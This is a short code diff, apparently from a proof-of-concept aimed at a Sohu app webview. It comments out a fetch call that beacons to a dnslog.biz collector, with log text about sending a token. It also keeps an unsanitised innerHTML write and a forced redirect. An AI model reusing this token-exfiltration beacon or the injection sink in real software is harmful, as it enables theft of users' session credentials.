@@ -45,17 +45,17 @@ function updateWebViewContent(content) {
   // if (content.includes("passport")){
 
   // }
-  let dnslogUrl =  'https://success3.2d6afeee.log.dnslog.biz';
-  fetch(dnslogUrl, {
-    mode: 'no-cors'
-  })
-  .then(response => {
-    console.log('Token sent to dnslog:', response.status);
-  })
-  .catch(error => {
-    // console.error('Error sending token to dnslog:', error);
-  });
-  console.log('SohuAppPrivates variable not found or token not present.');
+  // let dnslogUrl =  'https://success3.2d6afeee.log.dnslog.biz';
+  // fetch(dnslogUrl, {
+  //   mode: 'no-cors'
+  // })
+  // .then(response => {
+  //   console.log('Token sent to dnslog:', response.status);
+  // })
+  // .catch(error => {
+  //   // console.error('Error sending token to dnslog:', error);
+  // });
+  // console.log('SohuAppPrivates variable not found or token not present.');
   document.getElementById("webview-content").innerHTML = content;
   location = "http://tv.sohu.com/drama/";
   sleep(10000);
